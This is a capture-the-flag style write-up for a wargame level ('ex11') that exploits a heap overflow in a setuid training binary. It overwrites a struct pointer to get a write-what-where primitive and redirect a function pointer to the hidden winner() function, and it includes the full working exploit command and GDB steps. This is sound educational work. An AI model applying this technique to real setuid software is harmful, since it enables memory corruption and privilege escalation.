# ex11 — Heap Structure Pointer Overwrite (Function Pointer Hijack)

## Goal

Complete the level by making the program execute the hidden `winner()` function.

When successful, the binary prints:

```
and we have a winner @ <number>
```

---

# Binary Information

```bash
cd /opt/hole-in-bin/ex11

cat README.txt
file bin
strings bin
objdump -t bin | grep winner
```

Output:

```text
winner() = 0x08048494
```

This binary is

* 32-bit ELF
* dynamically linked
* setuid
* not stripped

---

# Finding the Hidden Function

Use `objdump`:

```bash
objdump -t bin | grep winner
```

Output

```
08048494 g     F .text     winner
```

Winner address:

```
0x08048494
```

Little Endian:

```
\x94\x84\x04\x08
```

---

# Program Layout

Disassemble `main`:

```bash
gdb -q ./bin
```

```
(gdb) disassemble main
```

Relevant instructions:

```
malloc(8)          -> struct1
malloc(8)          -> struct1->pointer

malloc(8)          -> struct2
malloc(8)          -> struct2->pointer

strcpy(struct1->pointer, argv[1])
strcpy(struct2->pointer, argv[2])

puts("and that's a wrap folks!")
```

Memory layout becomes

```
Heap
──────────────────────────────────────────────

struct1
+0x0  int id = 1
+0x4  char *buffer1
        │
        ▼

buffer1 (8 bytes)

struct2
+0x0  int id = 2
+0x4  char *buffer2
        │
        ▼

buffer2 (8 bytes)
```

---

# The Vulnerability

The program performs

```c
strcpy(struct1->pointer, argv[1]);
```

without checking the length.

Since `buffer1` is only 8 bytes, a longer input continues writing into the next heap object.

The next object in memory is **struct2**.

Therefore we can overwrite:

```
struct2->id
```

and more importantly

```
struct2->pointer
```

---

# Why This Works

Later the program executes

```c
strcpy(struct2->pointer, argv[2]);
```

Normally

```
struct2->pointer
```

points to its allocated heap buffer.

If we overwrite this pointer, we completely control the destination of the second `strcpy()`.

Instead of writing into heap memory, we can make it write anywhere.

---

# Target Address

We overwrite

```
struct2->pointer
```

with

```
0x08049774
```

Little endian:

```
\x74\x97\x04\x08
```

This address is a writable location that is later used as a function pointer target in this challenge.

---

# Second Argument

The second `strcpy()` copies

```
argv[2]
```

to the address stored in

```
struct2->pointer
```

So we simply copy

```
winner()
```

address

```
0x08048494
```

Little endian

```
\x94\x84\x04\x08
```

After the overwrite, the indirect function pointer now points to

```
winner()
```

instead of its original value.

---

# Exploit Layout

First argument

```
AAAAAAAAAAAAAAAAAAAA
\x74\x97\x04\x08
```

```
20 bytes padding
+
overwrite struct2->pointer
```

Second argument

```
\x94\x84\x04\x08
```

which becomes

```
*function_pointer = winner
```

---

# Final Exploit

```bash
./bin \
$(python -c "print 'A'*20 + '\x74\x97\x04\x08'") \
$(python -c "print '\x94\x84\x04\x08'")
```

Output

```
and we have a winner @ 1785947796
```

Level solved.

---

# Verifying with GDB

Start GDB:

```bash
gdb -q ./bin
```

Set breakpoints after each allocation and copy:

```gdb
break *main+21
break *main+47
break *main+68
break *main+127
break *main+156
```

Run:

```gdb
run AAAA BBBB
```

Useful inspection commands:

View the stack:

```gdb
x/32x $esp
```

View registers:

```gdb
info registers
```

Continue execution:

```gdb
continue
```

Disassemble `main` again if needed:

```gdb
disassemble main
```

Quit:

```gdb
quit
```

---

# Memory Before Overflow

```
buffer1
──────────────
AAAAAAAA

struct2
──────────────
id = 2

pointer
──────────────
0x0818d020
```

---

# Memory After Overflow

```
buffer1
──────────────────────────────

AAAAAAAAAAAAAAAAAAAA
0x08049774

struct2->pointer
──────────────────────────────

0x08049774
```

Second `strcpy()` writes

```
0x08048494
```

to

```
0x08049774
```

The function pointer now references `winner()`.

---

# Complete Attack Flow

```
argv1
      │
      ▼

buffer1 overflow
      │
      ▼

Overwrite struct2->pointer
      │
      ▼

Second strcpy()
      │
      ▼

Writes winner() address
      │
      ▼

Function pointer now points to winner()
      │
      ▼

winner()
      │
      ▼

and we have a winner
```

---

# Key Concepts Learned

* Heap overflows can corrupt adjacent heap objects.
* Overwriting pointers is often more powerful than overwriting data.
* `strcpy()` performs no bounds checking and can overwrite neighboring memory.
* By corrupting a pointer used in a later memory write, an attacker gains a **write-what-where** primitive.
* A write-what-where primitive can redirect execution by overwriting a function pointer with the address of a chosen function (`winner()` in this exercise).
* GDB breakpoints and memory inspection are invaluable for understanding heap layouts and verifying each stage of the exploit.
